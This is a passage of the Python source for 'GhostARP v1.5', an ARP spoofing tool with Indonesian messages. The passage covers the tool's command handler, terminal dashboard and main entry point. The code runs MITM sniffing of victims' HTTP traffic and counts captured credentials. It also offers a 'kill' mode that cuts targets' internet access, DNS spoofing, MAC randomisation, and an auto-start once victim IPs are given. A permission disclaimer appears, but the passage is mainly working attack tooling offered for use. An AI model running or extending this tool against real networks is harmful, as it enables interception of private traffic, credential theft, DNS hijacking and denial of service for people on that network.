                    
                    if target_ip:
                        attack.del_victim(target_ip, state)

        elif c in ("scan", "sweep", "rescan"):
            background_scan(state)

        elif c == "pause":
            attack.set_paused(True, state)
        elif c == "resume":
            attack.set_paused(False, state)
        elif c == "mode":
            if len(parts) < 2:
                state.add_log(f"Mode sekarang: {attack.mode.upper()}", "cyan")
            else:
                attack.set_mode(parts[1], state)
                state.mode = attack.mode
        elif c == "dns":
            if len(parts) < 2:
                state.add_log("dns add d=ip | dns del d | dns list", "cyan")
                return
            sub = parts[1].lower()
            if sub in ("add", "+"):
                for tok in ",".join(parts[2:]).split(","):
                    if "=" in tok:
                        d, ip = tok.split("=", 1)
                        attack.dns_add(d, ip, state)
                        state.dns_spoof_map = attack.spoof_snapshot()
            elif sub in ("del", "-"):
                for tok in parts[2:]:
                    attack.dns_del(tok, state)
                    state.dns_spoof_map = attack.spoof_snapshot()
            elif sub in ("list", "ls"):
                m = attack.spoof_snapshot()
                state.add_log("DNS spoof: " + (", ".join(f"{d}->{ip}" for d, ip in m.items()) or "kosong"), "cyan")
        else:
            state.add_log(f"Perintah tidak dikenal saat attack: '{cmd}' (ketik 'help' atau 'stop')", "red")


# --------------------------------------------------------------------------
# Main raw reader loop
# --------------------------------------------------------------------------
def _reader_loop(state: State, stop_event: threading.Event, inp: InputState, attack_ref: List[Optional[ArpSpoof]]) -> None:
    _enter_cbreak()
    buf = ""
    try:
        while not stop_event.is_set():
            if WINDOWS:
                if msvcrt.kbhit():
                    try:
                        ch = msvcrt.getch()
                    except OSError:
                        break
                    if ch in (b'\r', b'\n'):
                        cmd, buf = buf, ""
                        inp.buf = ""
                        handle_cmd(state, cmd, attack_ref, stop_event)
                    elif ch in (b'\x7f', b'\x08'):  # Backspace
                        buf = buf[:-1]
                        inp.buf = buf
                    elif ch == b'\x03':  # Ctrl+C
                        stop_event.set()
                        state.add_log("Ctrl+C - menghentikan...", "yellow")
                        break
                    else:
                        try:
                            c = ch.decode("utf-8")
                            if ord(c) >= 32:
                                buf += c
                                inp.buf = buf
                        except UnicodeDecodeError:
                            pass
                else:
                    time.sleep(0.05)
            else:
                r, _, _ = select.select([sys.stdin], [], [], 0.5)
                if not r:
                    continue
                try:
                    ch = os.read(sys.stdin.fileno(), 1)
                except OSError:
                    break
                if not ch:
                    break
                c = ch.decode("utf-8", errors="ignore")
                if c in ("\r", "\n"):
                    cmd, buf = buf, ""
                    inp.buf = ""
                    handle_cmd(state, cmd, attack_ref, stop_event)
                elif c in ("\x7f", "\x08"):
                    buf = buf[:-1]
                    inp.buf = buf
                elif c == "\x03":
                    stop_event.set()
                    state.add_log("Ctrl+C - menghentikan...", "yellow")
                    break
                elif ord(c) >= 32:
                    buf += c
                    inp.buf = buf
    finally:
        _restore_termios()


# --------------------------------------------------------------------------
# UI dashboard builders
# --------------------------------------------------------------------------
def fmt_uptime(secs: float) -> str:
    h, rem = divmod(int(secs), 3600)
    m, s = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"


def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[ArpSpoof]], stop_event: threading.Event) -> Panel:
    http, dns, log, creds = state.snapshot()
    
    if state.status == "SETUP":
        # Info Panel Left
        info = Table.grid(padding=(0, 2))
        info.add_column(style="cyan bold")
        info.add_column()
        info.add_row("Interface", f"[white]{state.iface}[/]  ([dim]{state.own_mac}[/])")
        info.add_row("IP / Netmask", f"[white]{state.own_ip}[/] / [dim]{state.net.netmask}[/]")
        info.add_row("Gateway IP", f"[bold yellow]{state.gateway_ip}[/]")
        
        gw_mac_str = state.gateway_mac
        if not gw_mac_str:
            if state.resolving_gateway:
                gw_mac_str = "[blink yellow]Resolving...[/]"
            else:
                gw_mac_str = "[red]Unresolved (type 'start' or 'set gw')[/]"
        else:
            gw_mac_str = f"[green]{gw_mac_str}[/]"
        info.add_row("Gateway MAC", gw_mac_str)
        
        mode_style = "red" if state.mode == "kill" else "green"
        mode_desc = "MITM (Internet OK, Sniffing ON)" if state.mode == "mitm" else "KILL (Internet BLOCKED)"
        info.add_row("Attack Mode", f"[bold {mode_style}]{mode_desc}[/]")
        info.add_row("MAC Spoofing", "[green]ENABLED[/] (Randomized on start)" if state.mac_spoof else "[dim]DISABLED[/]")
        info.add_row("DNS Spoofing", f"[yellow]{len(state.dns_spoof_map)}[/] domains active")
        
        info_panel = Panel(info, title="[bold cyan]🔧 Configuration[/]", border_style="cyan", expand=True)

        # Targets Panel Left
        vt = Table(box=SIMPLE_HEAVY, header_style="bold yellow", expand=True)
        vt.add_column("IP Address", style="bold yellow")
        vt.add_column("MAC Address", style="cyan")
        
        for v in state.victims:
            vt.add_row(v.ip, v.mac)
            
        targets_title = f"[bold yellow]🎯 Selected Targets ({len(state.victims)})[/]"
        targets_panel = Panel(
            vt if state.victims else Text("\n  Daftar target kosong.\n  Ketik 'add <ip_atau_nomor>' untuk menambahkan.", style="dim italic"), 
            title=targets_title, 
            border_style="yellow", 
            expand=True
        )

        # Hosts Panel Right
        hosts = state.scanned_hosts
        ht = Table(box=SIMPLE_HEAVY, header_style="bold green", expand=True)
        ht.add_column("#", justify="right", style="dim")
        ht.add_column("IP Address", style="bold yellow")
        ht.add_column("MAC Address", style="cyan")
        ht.add_column("Status")
        
        target_ips = {v.ip for v in state.victims}
        for i, (ip, mac) in enumerate(hosts[:HOSTS_DISPLAY_MAX]):
            if ip == state.gateway_ip:
                status = "[red]GATEWAY[/]"
            elif ip in target_ips:
                status = "[bold yellow]TARGET ✓[/]"
            else:
                status = "[dim]available[/]"
            ht.add_row(str(i + 1), ip, mac, status)
            
        hosts_title = f"[bold green]🔍 Discovered Hosts ({len(hosts)})[/]"
        if state.scanning:
            hosts_title += " [blink yellow](Scanning...)[/]"
            
        hosts_panel = Panel(
            ht if hosts else Text("\n  Tidak ada host / Belum scan.\n  Ketik 'scan' untuk memindai jaringan.", style="dim italic"),
            title=hosts_title,
            border_style="green",
            expand=True
        )

        # Event log panel
        log_table = Table(box=SIMPLE_HEAVY, header_style="bold magenta", expand=True)
        log_table.add_column("Waktu", style="dim", width=8)
        log_table.add_column("Action / Event")
        for ts, msg, style in log[-8:]:
            log_table.add_row(ts, f"[{style}]{msg}[/]")
        log_panel = Panel(log_table, title="[bold magenta]📝 Configuration Logs[/]", border_style="magenta", expand=True)

        # Layout grids
        top_grid = Table.grid(padding=(0, 1), expand=True)
        top_grid.add_column(ratio=1)
        top_grid.add_column(ratio=1)
        
        left_grid = Table.grid(padding=(0, 1), expand=True)
        left_grid.add_row(info_panel)
        left_grid.add_row(targets_panel)
        
        top_grid.add_row(left_grid, hosts_panel)

        bar = Table.grid(padding=(0, 1), expand=True)
        bar.add_row(Text("Setup Config > ", style="bold cyan") + Text(inp.buf) + Text("▏", style="white"))
        
        subtitle = (
            "Type: [white]add <ip|num>[/] | [white]del <ip|num|all>[/] | [white]set <iface|gw|mode> <val>[/] | [white]macspoof <on|off>[/]\n"
            "      [white]scan[/] | [bold green]start[/] | [bold red]quit[/]"
        )
        
        return Panel(
            Group(top_grid, log_panel, bar),
            title="[bold cyan]⚡ GHOSTARP v1.5 - Setup Mode ⚡[/]",
            subtitle=subtitle,
            border_style="cyan"
        )
        
    else:
        attack = attack_ref[0]
        if not attack:
            return Panel(Text("Mempersiapkan engine attack...", style="yellow"))
            
        victims = attack.victims_snapshot()
        total_pkts = attack.total_packets
        
        info = Table.grid(padding=(0, 2))
        info.add_column(style="red bold")
        info.add_column()
        info.add_row("Interface", f"[white]{state.iface}[/]  ([dim]{state.own_mac}[/])")
        info.add_row("Gateway IP", f"[white]{state.gateway_ip}[/]  ([dim]{state.gateway_mac}[/])")
        
        mode_style = "red" if attack.mode == "kill" else "green"
        mode_desc = "MITM (Sniffing Active)" if attack.mode == "mitm" else "KILL (Internet Cut)"
        info.add_row("Mode", f"[bold {mode_style}]{mode_desc}[/]")
        info.add_row("Poisoning", "[bold red]POISONING ACTIVE[/]" if not attack.paused else "[yellow]PAUSED[/]")
        info.add_row("Uptime", f"[white]{fmt_uptime(time.time() - state.start_time)}[/]")
        
        info_panel = Panel(info, title="[bold red]💀 Attack Status[/]", border_style="red", expand=True)

        stats = Table.grid(padding=(0, 2))
        stats.add_column(style="magenta bold")
        stats.add_column(justify="right")
        stats.add_row("Paket ARP terkirim", f"[bold red]{total_pkts:,}[/]")
        stats.add_row("Target ter-poison", f"[yellow]{len(victims)}[/]")
        stats.add_row("HTTP Sniffed", f"[green]{len(http):,}[/]")
        stats.add_row("DNS Spoofed", f"[cyan]{len(attack.spoof_snapshot())}[/]")
        stats.add_row("Credentials Captured", f"[bold blink red]{creds}[/]")
        stats_panel = Panel(stats, title="[bold magenta]📊 Statistics[/]", border_style="magenta", expand=True)

        vt = Table(box=SIMPLE_HEAVY, header_style="bold yellow", expand=True)
        vt.add_column("Target IP", style="bold yellow")
        vt.add_column("Target MAC", style="cyan")
        vt.add_column("Packets Sent", justify="right")
        for v in victims:
            vt.add_row(v.ip, v.mac, f"{v.packets:,}")
        targets_panel = Panel(vt, title="[bold yellow]🎯 Poisoned Victims[/]", border_style="yellow", expand=True)

        # Hosts Panel Right
        hosts = state.scanned_hosts
        ht = Table(box=SIMPLE_HEAVY, header_style="bold green", expand=True)
        ht.add_column("#", justify="right", style="dim")
        ht.add_column("IP Address", style="bold yellow")
        ht.add_column("MAC Address", style="cyan")
        ht.add_column("Status")
        
        target_ips = {v.ip for v in victims}
        for i, (ip, mac) in enumerate(hosts[:HOSTS_DISPLAY_MAX]):
            if ip == state.gateway_ip:
                status = "[red]GATEWAY[/]"
            elif ip in target_ips:
                status = "[bold yellow]TARGET ✓[/]"
            else:
                status = "[dim]available[/]"
            ht.add_row(str(i + 1), ip, mac, status)
            
        hosts_title = f"[bold green]🔍 Discovered Hosts ({len(hosts)})[/]"
        if state.scanning:
            hosts_title += " [blink yellow](Scanning...)[/]"
            
        hosts_panel = Panel(
            ht if hosts else Text("\n  Tidak ada host / Belum scan.\n  Ketik 'scan' untuk memindai jaringan.", style="dim italic"),
            title=hosts_title,
            border_style="green",
            expand=True
        )

        http_table = Table(box=SIMPLE_HEAVY, header_style="bold cyan", expand=True)
        http_table.add_column("Waktu", style="dim", width=8)
        http_table.add_column("Source IP", style="bold yellow")
        http_table.add_column("Type/Method", width=12)
        http_table.add_column("Details")
        
        for ts, src, method, url in http[-6:]:
            mstyle = "bold red" if method == "POST" else "green"
            http_table.add_row(ts, src, f"[{mstyle}]{method}[/]", url)
            
        sniff_panel = Panel(http_table, title=f"[bold cyan]🌐 Live Intercepted Traffic (Sniff Ports: {attack.sniff_ports})[/]", border_style="cyan", expand=True)

        log_table = Table(box=SIMPLE_HEAVY, header_style="bold green", expand=True)
        log_table.add_column("Waktu", style="dim", width=8)
        log_table.add_column("Event")
        for ts, msg, style in log[-8:]:
            log_table.add_row(ts, f"[{style}]{msg}[/]")
        log_panel = Panel(log_table, title="[bold green]📝 Event Logs[/]", border_style="green", expand=True)

        top_grid = Table.grid(padding=(0, 1), expand=True)
        top_grid.add_column(ratio=1)
        top_grid.add_column(ratio=1)
        top_grid.add_column(ratio=1)
        
        left_grid = Table.grid(padding=(0, 1), expand=True)
        left_grid.add_row(info_panel)
        left_grid.add_row(stats_panel)
        
        top_grid.add_row(left_grid, targets_panel, hosts_panel)

        bar = Table.grid(padding=(0, 1), expand=True)
        bar.add_row(Text("Attack Active > ", style="bold red") + Text(inp.buf) + Text("▏", style="red"))
        
        subtitle = (
            "Type: [bold yellow]stop[/] | [white]pause[/] | [white]resume[/] | [white]mode <mitm|kill>[/] | [white]add <ip|num>[/] | [white]del <ip|num|all>[/]\n"
            "      [white]scan[/] | [white]dns add d=ip[/] | [white]dns del d[/] | [bold red]quit[/]"
        )
        
        return Panel(
            Group(top_grid, sniff_panel, log_panel, bar),
            title="[bold blink red]💀 GHOSTARP v1.5 - ATTACK ACTIVE 💀[/]",
            subtitle=subtitle,
            border_style="red"
        )


def _dash_loop(state: State, inp: InputState, attack_ref: List[Optional[ArpSpoof]], stop_event: threading.Event) -> None:
    with Live(build_dashboard(state, inp, attack_ref, stop_event),
              console=console, refresh_per_second=4, screen=True) as live:
        while not stop_event.is_set():
            live.update(build_dashboard(state, inp, attack_ref, stop_event))
            stop_event.wait(0.25)


# --------------------------------------------------------------------------
# Main flow
# --------------------------------------------------------------------------
def main() -> int:
    ap = argparse.ArgumentParser(description="GhostARP - ARP Spoofing / MITM / DoS")
    ap.add_argument("-i", "--iface", help="Interface jaringan (auto-detect jika kosong)")
    ap.add_argument("-t", "--target", help="IP korban, pisahkan koma untuk multi-target")
    ap.add_argument("--targets-file", help="File daftar korban (satu IP per baris, # = komentar)")
    ap.add_argument("-g", "--gateway", help="IP gateway (auto-detect jika kosong)")
    ap.add_argument("--mode", choices=["mitm", "kill"],
                    help="mitm = sniff (internet jalan) | kill = putus internet korban")
    ap.add_argument("--dead-mac", action="store_true",
                    help="(mode kill) poison ke MAC mati 00:00:00:00:00:00 - murni DoS, sniff korban OFF")
    ap.add_argument("--dns-file", help="File DNS spoof: 'domain ip' atau 'domain=ip' per baris")
    ap.add_argument("--mac-spoof", action="store_true", help="Randomize MAC sebelum attack")
    ap.add_argument("--sniff-ports", default="80,8080",
                    help="Port HTTP yang di-sniff (default: 80,8080)")
    ap.add_argument("--timeout", type=float, default=None,
                    help="Auto-stop setelah N detik (untuk automation)")
    ap.add_argument("--version", action="version", version="GhostARP 1.5")
    args = ap.parse_args()

    # Logo and Root warning checks
    console.print(BANNER)
    console.print(Panel(
        "[dim]Tool untuk pengujian keamanan pada jaringan yang Anda miliki / memiliki izin. "
        "Penggunaan di luar itu adalah ilegal.[/]",
        border_style="yellow"))

    if not WINDOWS and os.geteuid() != 0:
        console.print("[red][!] Jalankan sebagai root: sudo python3 ghostarp.py[/]")
        return 1

    # Initialize state
    state = State()
    
    # Resolve interface
    ifaces = list_up_interfaces()
    iface = args.iface
    if iface and iface in ifaces:
        state.iface = iface
    elif ifaces:
        state.iface = ifaces[0]
    else:
        state.iface = "eth0"
        
    state.own_ip = get_ip(state.iface)
    state.own_mac = get_mac(state.iface)
    state.net = get_network(state.iface)
    state._orig_mac = state.own_mac
    
    # Resolve gateway IP
    state.gateway_ip = args.gateway or get_default_gateway() or "192.168.1.1"
    state.gateway_mac = ""  # Resolves in background
    
    # Configure mode & options
    state.mode = args.mode or "mitm"
    state.dead_mac = args.dead_mac
    state.mac_spoof = args.mac_spoof
    
    # Parse DNS file
    if args.dns_file:
        state.dns_file = args.dns_file
        state.dns_spoof_map = load_spoof_map(path=args.dns_file)
        
    # Pre-populated targets
    if args.target or args.targets_file:
        state.victims = parse_targets_cli(args.target, args.targets_file, state.iface)
        state.add_log(f"Preloaded {len(state.victims)} targets from CLI args.", "green")

    # Start background discovery tasks
    background_resolve_gateway(state)
    background_scan(state)

    # UI variables
    attack_ref: List[Optional[ArpSpoof]] = [None]
    stop_event = threading.Event()
    inp = InputState()
    
    # Auto-start attack if targets are explicitly pre-loaded via CLI
    if args.target or args.targets_file:
        handle_cmd(state, "start", attack_ref, stop_event)

    if args.timeout:
        threading.Timer(args.timeout, stop_event.set).start()
        state.add_log(f"Auto-stop set to {args.timeout} seconds.", "yellow")
        
    signal.signal(signal.SIGTERM, lambda s, f: stop_event.set())

    try:
        # Run live dashboard thread
        dash_thread = threading.Thread(
            target=_dash_loop,
            args=(state, inp, attack_ref, stop_event),
            daemon=True
        )
        dash_thread.start()
        
        # Read commands on the main thread (cbreak raw reader)
        if sys.stdin.isatty():
            _reader_loop(state, stop_event, inp, attack_ref)
        else:
            state.add_log("Non-interactive mode (stdin is not a TTY). Waiting...", "dim")
            while not stop_event.is_set():
                stop_event.wait(0.5)
    except KeyboardInterrupt:
        state.add_log("Interrupt keyboard diterima...", "yellow")
    finally:
        stop_event.set()
        _restore_termios()
        if 'dash_thread' in locals():
            dash_thread.join(timeout=2.0)
            
        # Clean up active attack
        if attack_ref[0]:
            attack_ref[0].stop.set()
            attack_ref[0].restore()
            
        # Restore MAC address
        orig_mac = state._orig_mac
        current_mac = get_mac(state.iface)
        if orig_mac and current_mac != orig_mac:
            try:
                change_mac(state.iface, orig_mac)
                console.print(f"[green][*] MAC interface dipulihkan ke {orig_mac}[/]")
            except Exception:
                console.print(f"[red][!] Gagal restore MAC interface[/]")
                
        # Restore forwarding
        if hasattr(state, '_orig_fwd'):
            set_ip_forward(state._orig_fwd == "1")

        # Show execution summary
        _, _, log, creds = state.snapshot()
        vs = state.victims
        summary_lines = "\n".join(f"    {v.ip}: [bold]{v.packets:,}[/] paket" for v in vs)
        console.print(Panel(
            f"[green]Attack selesai.[/]\n"
            f"Mode            : {state.mode.upper()}\n"
            f"Target(s)       : {len(vs)}\n{summary_lines}\n"
            f"HTTP ter-sniff  : {len(state.http)}\n"
            f"DNS ter-spoof   : {len(state.dns)}\n"
            f"Kredensial      : [bold red]{creds}[/]\n"
            f"[dim]ARP cache semua target & gateway sudah dikembalikan.[/]",
            title="[bold cyan]Ringkasan[/]", border_style="cyan"
        ))
        
    return 0


if __name__ == "__main__":
    sys.exit(main())